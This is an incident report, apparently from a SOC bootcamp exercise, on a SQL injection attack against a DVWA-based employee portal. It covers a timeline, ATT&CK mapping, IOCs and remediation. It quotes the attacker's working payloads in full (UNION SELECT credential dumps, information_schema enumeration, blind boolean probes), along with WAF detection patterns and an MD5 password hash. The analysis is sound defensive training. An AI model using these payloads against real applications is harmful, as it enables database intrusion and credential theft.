# Incident Report: INC-2026-004
## SQL Injection Attack on NexaCorp Employee Portal (bru-web-01)

---

| Field | Value |
|-------|-------|
| **Incident ID** | INC-2026-004 |
| **Classification** | HIGH: Database credential exfiltration via SQL Injection |
| **Date of Incident** | 2026-05-30 (Friday, 09:34 to 15:28 CEST) |
| **Date of Report** | 2026-06-06 |
| **Analyst** | André Penas |
| **Organisation** | BeCode Corp SOC, contracted by NexaCorp |
| **Target System** | `bru-web-01`, NexaCorp employee self-service portal |
| **Technology** | DVWA (PHP/MySQL web application) |
| **Attack Source** | `172.16.50.10` (external, outside NexaCorp 192.168.10.0/24) |

> **Note on investigation completeness:** Missions 3 (Wazuh alert analysis), 4 (auth.log consequence / credential reuse), and 6 (Suricata detection rules) were not completed during this investigation. Findings in this report are based on confirmed evidence from the web access log (`web_access.log`) and network packet capture (`attack.pcap`). Sections where evidence is missing are clearly marked.

---

## 1. Executive Summary

INC-2026-004 is the fourth confirmed security incident affecting NexaCorp infrastructure in May 2026 and represents a deliberate pivot to a new attack surface. Following INC-2026-001 through 003 (which resulted in the compromise of three Linux servers), the same threat actor shifted strategy and targeted the NexaCorp employee self-service portal (`bru-web-01`) on 30 May 2026.

The attacker exploited a SQL injection vulnerability in the portal's account-lookup form. By injecting database commands into the `id` parameter, they were able to bypass the application layer entirely and query the back-end MySQL database directly. Over the course of approximately six hours, the attacker systematically enumerated the database structure and extracted the complete contents of the `users` table, including usernames and MD5-hashed passwords for five accounts: `admin`, `j.martin`, `gordonb`, `pablo`, and `smithy`.

The first confirmed credential dump occurred at **09:39:58 CEST**, producing a 5,745-byte response containing all user records. The attack was conducted in multiple sessions across the day, with the attacker also performing blind boolean enumeration — a slower, stealthier technique that extracts password content character by character without relying on visible database output.

The full downstream impact of the credential theft (credential reuse against other services, further lateral movement) could not be confirmed in this report due to incomplete analysis of the `auth.log` file. This must be treated as a high-priority open item.

---

## 2. How Did the Attacker Get In?

The attacker exploited a classic SQL Injection vulnerability in the employee portal's account-lookup form. The form passes user input directly into a back-end MySQL query without sanitisation or parameterisation. The vulnerable endpoint is:

```
GET /dvwa/vulnerabilities/sqli/?id=<USER_INPUT>&Submit=Submit
```

By replacing the expected numeric user ID with SQL syntax, the attacker was able to append arbitrary database commands to the query. No authentication bypass was required — the attacker first authenticated to the DVWA portal using known credentials (via `curl`-based POST login), then attacked the vulnerable search form from within the authenticated session.

The attacking IP `172.16.50.10` is external to NexaCorp's internal office network (`192.168.10.0/24`) and does not correspond to any known NexaCorp asset. The attacker's browser User-Agent string identifies a Linux system running Firefox 115.0 (Kali Linux or similar), consistent with an offensive security toolset.

**Key evidence (web_access.log — first injection probe):**
```
172.16.50.10 - - [30/May/2026:09:35:02 +0200] "GET /dvwa/vulnerabilities/sqli/?id=1%27&Submit=Submit HTTP/1.1" 200 5014
```
The URL-encoded `%27` is a single quote (`'`). Inserting a single quote into a SQL query without escaping produces a syntax error, which the application returned to the browser — confirming the injection point.

---

## 3. Attack Chain: Step by Step

### Step 1: Initial authentication to DVWA portal
`2026-05-30 09:34:03 CEST` | source: `web_access.log`

The attacker authenticated to the DVWA portal using a `curl`-based HTTP POST to `/dvwa/login.php`, followed by a POST to `/dvwa/security.php` to set the security level to **low** (disabling application-level input filtering). This confirms the attacker had valid portal credentials prior to the attack.

```
172.16.50.10 - [30/May/2026:09:34:03] "GET /dvwa/login.php" 200
172.16.50.10 - [30/May/2026:09:34:03] "POST /dvwa/login.php" 302
172.16.50.10 - [30/May/2026:09:34:03] "POST /dvwa/security.php" 200
```

### Step 2: Error-based injection probe — confirming the vulnerability
`2026-05-30 09:35:02 CEST` | source: `web_access.log`

The attacker sent three test payloads to the `id` parameter:

| Payload (decoded) | Response | Purpose |
|---|---|---|
| `id=1'` | HTTP 200 / 5014 bytes | Database error → field is injectable |
| `id=1''` | HTTP 200 / 4925 bytes | Double quote → escaped → confirms string context |
| `id=1' OR '1'='1` | HTTP 200 / 5283 bytes | Logic bypass → returns all rows |

The differing response sizes confirm the application's behaviour changes based on injected SQL, and that error messages are returned to the browser — a prerequisite for UNION-based extraction.

### Step 3: Column count via ORDER BY
`2026-05-30 09:37:24–09:37:27 CEST` | source: `web_access.log`

The attacker determined the number of columns in the original SELECT query using incrementing `ORDER BY` clauses:

| Payload | Response | Result |
|---|---|---|
| `id=1' ORDER BY 1-- -` | HTTP 200 | 1 column valid |
| `id=1' ORDER BY 2-- -` | HTTP 200 | 2 columns valid |
| `id=1' ORDER BY 3-- -` | **HTTP 500** | Error → only 2 columns exist |

**Finding:** The query returns **2 columns**. This is required to construct a valid `UNION SELECT` statement.

### Step 4: UNION SELECT structure probe
`2026-05-30 09:37:28–09:37:30 CEST` | source: `web_access.log`

With 2 columns confirmed, the attacker tested whether both columns are string-capable and which column is displayed in the browser response:

```
id=1' UNION SELECT NULL,NULL-- -        → HTTP 200 / 5028 bytes
id=1' UNION SELECT NULL,@@version-- -  → HTTP 200 / 5064 bytes
```

The second payload successfully returned the MySQL server version in the browser, confirming that column 2 is reflected in the page output and that UNION-based extraction is fully operational.

### Step 5: Database enumeration
`2026-05-30 09:38:29–09:38:34 CEST` | source: `web_access.log`

The attacker performed systematic database reconnaissance using `information_schema` queries:

| Timestamp | Payload (decoded) | Extracted |
|---|---|---|
| 09:38:29 | `UNION SELECT NULL,database()-- -` | Current database name: **`dvwa`** |
| 09:38:30 | `UNION SELECT NULL,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -` | Table list (includes `users`) |
| 09:38:33 | `UNION SELECT NULL,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- -` | Column list of `users` table |
| 09:38:34 | `UNION SELECT NULL,count(*) FROM users-- -` | Total row count of `users` table |

**Database name confirmed:** `dvwa` (verified against TCP stream 14 in `attack.pcap`)

### Step 6: Full credential dump — first exfiltration event
`2026-05-30 09:39:58 CEST` | source: `web_access.log`, `attack.pcap`

At **09:39:58**, the attacker executed the primary data extraction query. The server responded with **5,745 bytes** — the largest response in the entire attack log — confirming that multiple database rows were returned in the HTTP response body.

```
GET /dvwa/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users-- -
→ HTTP 200 / 5745 bytes
```

This single request returned all usernames and password hashes from the `users` table. The attacker immediately followed with individual per-user queries to confirm each account separately:

| Timestamp | Account queried | HTTP Status | Response Size |
|---|---|---|---|
| 09:39:58 | All users (bulk dump) | 200 | **5745 bytes** |
| 09:39:58 | `admin` | 200 | 5133 bytes |
| 09:39:59 | `j.martin` | 200 | 5142 bytes |
| 09:39:59 | `gordonb` | 200 | 5139 bytes |
| 09:40:00 | `pablo` | 200 | 5133 bytes |
| 09:40:00 | `smithy` | 200 | 5136 bytes |

**Five accounts confirmed exfiltrated.** The admin password hash `5f4dcc3b5aa765d61d8327deb882cf99` was verified from TCP stream 447 in `attack.pcap`. This is an MD5 hash. Hash cracking (hashcat) was not completed during this investigation — cleartext password is unconfirmed.

### Step 7: Blind boolean enumeration
`2026-05-30 09:41:38–09:41:43 CEST` | source: `web_access.log`

After the UNION-based dump, the attacker also performed **blind boolean enumeration** — a character-by-character password extraction technique that does not require the application to return visible data. Payloads used include:

```sql
id=1' AND SUBSTRING(password,1,1)='a'-- -    (true/false based on response size)
id=1' AND ASCII(SUBSTRING(password,1,1))=65-- -
id=1' AND LENGTH(password)=32-- -
id=1' AND 1=1-- -    (baseline true — response: 4936 bytes)
id=1' AND 1=2-- -    (baseline false — response: 4864 bytes)
```

The response size difference between a true condition (4936 bytes) and a false condition (4864 bytes) allowed the attacker to infer password content without direct output. The key finding at `15:28:08` confirms the password hash is **32 characters long** (MD5 length), matching the UNION dump.

This technique continued across multiple reconnected sessions throughout the afternoon (14:18, 15:26–15:28 CEST), indicating the attacker was systematically verifying or extending their extracted data.

---

## 4. Attack Timeline

| # | Timestamp (CEST) | Event | Log Source | ATT&CK |
|---|---|---|---|---|
| 1 | `09:34:03` | Attacker authenticates to DVWA portal from 172.16.50.10 (curl, valid credentials) | web_access.log | T1078 |
| 2 | `09:34:03` | Attacker sets DVWA security level to **low** via POST to `/dvwa/security.php` | web_access.log | T1562 |
| 3 | `09:35:02` | Error-based injection probe: `id=1'` returns HTTP 200 with database error — injection point confirmed | web_access.log | T1190 |
| 4 | `09:35:02` | Logic bypass probe: `id=1' OR '1'='1` — confirms all-rows retrieval | web_access.log | T1190 |
| 5 | `09:37:24–27` | `ORDER BY` column count: ORDER BY 3 triggers HTTP 500 → **2 columns confirmed** | web_access.log | T1190 |
| 6 | `09:37:28–30` | `UNION SELECT NULL,NULL` and `UNION SELECT NULL,@@version` — column 2 reflected in output | web_access.log | T1190 |
| 7 | `09:38:29` | `UNION SELECT NULL,database()` — **database name `dvwa` extracted** | web_access.log | T1213 |
| 8 | `09:38:30` | `information_schema.tables` enumeration — table names extracted including `users` | web_access.log | T1213 |
| 9 | `09:38:33` | `information_schema.columns` enumeration for table `users` — column names extracted | web_access.log | T1213 |
| 10 | `09:38:34` | `count(*) FROM users` — user row count confirmed | web_access.log | T1213 |
| 11 | **`09:39:58`** | **`UNION SELECT user,password FROM users` — full credential dump, 5745-byte response** | web_access.log | T1555 |
| 12 | `09:39:58–09:40:00` | Individual per-user queries for admin, j.martin, gordonb, pablo, smithy — all return HTTP 200 | web_access.log | T1555 |
| 13 | `09:41:38–43` | Blind boolean enumeration begins: SUBSTRING + ASCII + LENGTH on password fields | web_access.log | T1190 |
| 14 | `10:21:59` | Attacker returns, session expired (all requests return HTTP 302) — no data extracted | web_access.log | - |
| 15 | `12:04:59–12:59:42` | Repeated reconnaissance queries (all return HTTP 302 — session still invalid) | web_access.log | - |
| 16 | `14:18:19` | New session — attacker re-authenticates; **second full dump: 5745 bytes** | web_access.log | T1555 |
| 17 | `14:18:40–14:20:03` | Second round of individual per-user extraction (admin, j.martin, gordonb, pablo, smithy) | web_access.log | T1555 |
| 18 | `15:26:41–15:28:43` | Extended blind boolean enumeration: `LENGTH(password)=32` confirms MD5 hash length | web_access.log | T1190 |

All timestamps are CEST (UTC+2), 2026-05-30.

---

## 5. MITRE ATT&CK Mapping

| Technique ID | Name | Description |
|---|---|---|
| T1190 | Exploit Public-Facing Application | SQL injection via unsanitised `id` parameter in `/dvwa/vulnerabilities/sqli/` |
| T1078 | Valid Accounts | Attacker authenticated to DVWA portal using existing credentials before exploiting the injection |
| T1562 | Impair Defenses | Set application security level to low to disable input filtering |
| T1213 | Data from Information Repositories | Enumerated `information_schema` for database name, table list, and column structure |
| T1555 | Credentials from Password Stores | Extracted all usernames and MD5 password hashes from the `users` table via UNION injection |

---

## 6. Indicators of Compromise (IOCs)

| Type | Value |
|------|-------|
| Attacker source IP | `172.16.50.10` (external, not in NexaCorp 192.168.10.0/24) |
| Attacker User-Agent | `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0` |
| Target host | `bru-web-01` |
| Vulnerable endpoint | `GET /dvwa/vulnerabilities/sqli/` |
| Vulnerable parameter | `id` |
| Database exfiltrated | `dvwa` |
| Table exfiltrated | `users` |
| First exfiltration timestamp | `2026-05-30 09:39:58 CEST` |
| Confirmed compromised accounts | `admin`, `j.martin`, `gordonb`, `pablo`, `smithy` |
| Admin password hash (MD5) | `5f4dcc3b5aa765d61d8327deb882cf99` |
| SQL injection payload patterns | `%27` (single quote), `UNION+SELECT`, `information_schema`, `AND+1%3D1`, `SUBSTRING`, `ASCII`, `LENGTH` |
| Attack tool indicator | `curl/8.14.1` (login automation) + Firefox 115 (injection) |

---

## 7. What Was Exposed

### Database credentials

The attacker successfully extracted the following from the `users` table in the `dvwa` database. All five accounts were confirmed exfiltrated in the bulk dump at 09:39:58 and individually verified in the per-user queries that followed.

| Username | Password Hash | Hash Type | Cracked (Cleartext) |
|---|---|---|---|
| `admin` | `5f4dcc3b5aa765d61d8327deb882cf99` | MD5 | Not confirmed — hashcat not run |
| `j.martin` | (in PCAP streams 449/518 — not extracted in notes) | MD5 | Unknown |
| `gordonb` | (in PCAP streams 450/519 — not extracted in notes) | MD5 | Unknown |
| `pablo` | (in PCAP streams 451/520 — not extracted in notes) | MD5 | Unknown |
| `smithy` | (in PCAP streams 452/521 — not extracted in notes) | MD5 | Unknown |

**Hash type:** MD5. MD5 is a broken hash function with no salting in this implementation. All hashes should be treated as effectively cracked by any attacker with access to common wordlists (rockyou.txt) or rainbow tables. The `admin` hash `5f4dcc3b5aa765d61d8327deb882cf99` is widely recognised and can be looked up in public databases without computation.

**Priority:** All five accounts must have their passwords rotated immediately. If any of these usernames correspond to Active Directory or SSH accounts on NexaCorp infrastructure, those systems are at immediate risk of credential reuse.

---

## 8. How Far Did the Attacker Get?

| Area | Status |
|------|--------|
| SQL injection vulnerability confirmed | **Confirmed** |
| DVWA portal security level bypassed (set to low) | **Confirmed** |
| Database name `dvwa` extracted | **Confirmed** |
| `users` table structure enumerated | **Confirmed** |
| All 5 user credentials (username + MD5 hash) exfiltrated | **Confirmed** |
| Credential hash cracking (cleartext passwords) | **Not confirmed — hashcat step not completed** |
| Credential reuse against SSH / other services | **Unknown — auth.log not analysed (Mission 4 incomplete)** |
| Blind boolean enumeration (character-level extraction) | **Confirmed in logs; extracted content not reconstructed** |
| Lateral movement beyond bru-web-01 | **Unknown — depends on auth.log analysis** |

---

## 9. Open Items — Investigation Not Complete

The following missions from the investigation guide were not completed and represent gaps in this report:

| Mission | What Was Not Done | Risk |
|---|---|---|
| Mission 3 — Wazuh alerts | Wazuh `wazuh-alerts.json` was not analysed; rule 31103 alert count and real timestamps not confirmed | Cannot independently corroborate log evidence via SIEM |
| Mission 4 — auth.log / credential reuse | `auth.log` was not checked for the attacker's IP or dumped usernames | **Critical gap** — if attacker reused `admin` or `j.martin` credentials against SSH, a fifth server may already be compromised |
| Mission 6 — Suricata detection rules | IDS rules were not written or tested | No detection coverage for future SQL injection on this endpoint |

**The auth.log analysis (Mission 4) is the highest priority.** Based on the pattern of previous incidents (INC-2026-001 through 003), this actor reliably reuses stolen credentials within hours. If `172.16.50.10` appears in `auth.log` after 09:39:58, an active compromise may be underway.

---

## 10. Immediate Remediation Actions

### Action 1: Rotate all five compromised account passwords immediately
The credentials for `admin`, `j.martin`, `gordonb`, `pablo`, and `smithy` are in the attacker's possession. If any of these usernames exist on other NexaCorp systems (Active Directory, SSH, VPN), treat those accounts as compromised and rotate them now.

```bash
# On bru-web-01 — reset DVWA user passwords
# (update the users table in MySQL with new, properly hashed passwords)
mysql -u root -p dvwa -e "UPDATE users SET password=MD5('NEW_PASSWORD') WHERE user='admin';"
```

Do not use MD5 for future password storage — see Action 5 below.

### Action 2: Analyse auth.log immediately
Run the following to check for credential reuse:
```bash
grep "172.16.50.10" /path/to/auth.log
grep -E "admin|j\.martin|gordonb|pablo|smithy" /path/to/auth.log | grep -i "accepted\|failed"
```
If any SSH or FTP logins from `172.16.50.10` are found after `09:39:58`, escalate to a new incident immediately.

### Action 3: Take bru-web-01 offline or block the attacker IP
Block `172.16.50.10` at the perimeter firewall immediately. The attacker was still active at `15:28:43` on the date of the attack. Verify they have no active session.

### Action 4: Apply parameterised queries to the vulnerable form
The root cause is unsanitised user input passed directly into SQL. The fix is **not** filtering or escaping — it is rewriting the database query to use prepared statements with bound parameters:

```php
// VULNERABLE (current)
$query = "SELECT * FROM users WHERE user_id = '$id';";

// FIXED — parameterised query
$stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
$stmt->execute([$id]);
```

This is the only reliable fix. Input filtering is an incomplete mitigation.

### Action 5: Replace MD5 with a proper password hashing algorithm
MD5 is not a password hash. Replace it with `bcrypt` or `argon2id`. Migrate all existing password hashes upon next user login (re-hash with the new algorithm on successful password entry).

### Action 6: Remove the ability to lower DVWA security level from a normal session
The attacker was able to POST to `/dvwa/security.php` and set the security level to `low`. This capability should be removed from production environments. If DVWA is only present for lab purposes, it must not be exposed on a production network segment.

### Action 7: Deploy a Web Application Firewall rule for SQL injection
While not a replacement for parameterised queries, a WAF rule can block or alert on the attack patterns observed:
- URL-encoded single quotes: `%27`
- `UNION+SELECT` in query parameters
- `information_schema` in query parameters
- `AND+1%3D` (boolean injection baseline)

---

## 11. Recommendations (Medium Term)

**Mandatory input validation at the application layer**
All user-supplied input that reaches a database must be handled via prepared statements. Conduct a code review of all other forms and endpoints in the employee portal for the same class of vulnerability. SQL injection is consistently in the OWASP Top 10 and is entirely preventable.

**Implement database least-privilege**
The web application's database account should only have `SELECT` rights on the tables it legitimately needs. It must not have access to `information_schema` in production, and must not be able to run `UNION SELECT` against other tables. A dedicated, restricted DB user for the portal prevents lateral movement within the database.

**Deploy SIEM detection rules for SQL injection patterns**
Wazuh rule 31103 fired during this incident, but the alerts were not acted upon in time. Create an alert escalation path: any Wazuh rule 31103 firing on `bru-web-01` must page the on-call analyst immediately, not wait for end-of-day log review.

**Implement HTTP response content filtering / WAF with blocking mode**
A WAF in monitoring mode provides visibility but not protection. Given that the attacker successfully extracted data in the first session, moving the WAF to blocking mode with SQL injection signatures would have prevented the exfiltration even if the underlying vulnerability remained.

**Audit all other web applications for the same vulnerability class**
If DVWA has this vulnerability in low-security mode, other NexaCorp web applications may have the same class of flaw in production. Conduct a web application vulnerability scan across all externally and internally accessible applications.

---

## 12. Four-Incident Kill Chain Summary

| Incident | System | Method | Outcome |
|---|---|---|---|
| INC-2026-001 | lge-services-01 | FTP backdoor exploitation | Initial foothold; `svc_api` public key planted on `lge-files-01` |
| INC-2026-002 | bru-app-01 | SUID `/usr/bin/find`; `it_support` backdoor created | Root access; `svc_api` private key harvested |
| INC-2026-003 | lge-files-01 | Stolen SSH key pivot; `sudo python3 NOPASSWD` | Root access; `sysupdate` backdoor; active C2 beacon; database credentials accessed |
| INC-2026-004 | bru-web-01 | SQL injection via unsanitised `id` parameter | Full `users` table exfiltrated; 5 accounts compromised; blind enumeration performed |

The actor's pivot to the web application layer after server-side remediation indicates adaptive tradecraft: when the Linux server attack surface was closed, they moved to a different vector. The web application was not included in the INC-2026-001/002/003 remediation scope. This gap allowed the attacker to maintain access to NexaCorp systems despite the previous patches.

---

*INC-2026-004 | Incident Report | BeCode Corp SOC Bootcamp*
*Analyst: Andre Penas — Classification: Confidential*
